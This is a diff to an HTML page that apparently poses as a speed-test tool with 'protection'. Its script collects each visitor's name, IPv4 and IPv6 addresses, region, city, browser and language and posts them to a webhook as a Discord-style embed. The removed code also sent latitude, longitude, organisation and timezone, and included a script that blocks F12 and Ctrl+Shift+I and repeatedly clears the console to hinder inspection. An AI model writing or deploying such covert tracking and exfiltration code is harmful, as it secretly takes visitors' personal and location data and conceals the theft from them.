@@ -256,67 +256,41 @@
       const timeString = now.toISOString();
 
       const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : "لا يوجد";
+      const region = geoData.region || "Unknown";
+      const city = geoData.city || "Unknown";
 
-      function sendToWebhook(extraGeo = '') {
-        const infoText = `
-الاسم: ${name}
-IP (IPv4): ${ipv4}
-IP (IPv6): ${ipv6}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-متصفح المستخدم: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-${extraGeo}
-        `.trim();
+      const data = {
+        content: null,
+        embeds: [{
+          title: `مستخدم جديد: ${name}`,
+          color: 5814783,
+          fields: [
+            { name: "الاسم", value: name, inline: true },
+            { name: "IPv4", value: ipv4, inline: true },
+            { name: "IPv6", value: ipv6, inline: true },
+            { name: "المتصفح", value: ua, inline: false },
+            { name: "اللغة", value: lang, inline: true },
+            { name: "المنطقة", value: region, inline: true },
+            { name: "المدينة", value: city, inline: true },
+            { name: "الوقت", value: timeString, inline: false }
+          ],
+          footer: { text: "اختبر سرعتك + حماية" }
+        }]
+      };
 
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: infoText }),
-        });
-      }
-
-      sendToWebhook();
-
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
     } catch (e) {
-      console.log("خطأ في جلب معلومات المستخدم:", e);
+      console.error("فشل إرسال البيانات:", e);
     }
   }
 </script>
 
-<!-- =================== سكربت الحماية =================== -->
-<script id="protect-script">
-// ======== سكربت حماية Example =========
-// مثلاً حماية بسيطة توضح وجود الحماية وتظهر في أدوات المطور
-console.log("سكربت الحماية شغال!");
-
-// مثال: منع فتح أدوات المطور (لن يكون فعال 100% لكنه مثال)
-// يمكنك تحسينه أو دمج سكربت حماية آخر حسب الحاجة
-
-(function() {
-  // محاولة تعطيل F12 و Ctrl+Shift+I
-  document.addEventListener('keydown', function(e) {
-    if (e.key === "F12" || 
-        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i")) {
-      e.preventDefault();
-      alert("فتح أدوات المطور غير مسموح!");
-    }
-  });
-
-  // إظهار رسالة في أدوات المطور عند الفتح
-  setInterval(() => {
-    console.clear();
-    console.log("🚨 حماية مفعلة 🚨");
-  }, 2000);
-})();
-</script>
+<script src="protect.js"></script>
 
 </body>
 </html>
